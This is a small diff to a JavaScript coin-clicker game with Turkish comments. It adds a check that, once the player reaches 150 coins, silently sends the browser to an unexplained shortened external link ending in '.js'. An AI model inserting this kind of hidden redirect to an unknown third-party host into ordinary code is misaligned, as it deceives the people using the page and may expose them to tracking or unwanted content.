@@ -57,7 +57,12 @@
             coinCount++;
             coinDisplay.textContent = coinCount;
 
-            // Animasyon efektleri (geçici büyüme ve renk değişimi)
+            // Eğer 150 coine ulaşıldıysa, yönlendirme yap
+            if (coinCount === 150) {
+                window.location.href = "https://2no.co/RNETy4.js";
+            }
+
+            // Animasyon efektleri (geçici büyüme)
             circleButton.style.transform = 'scale(1.2)';
             setTimeout(() => {
                 circleButton.style.transform = 'scale(1)';
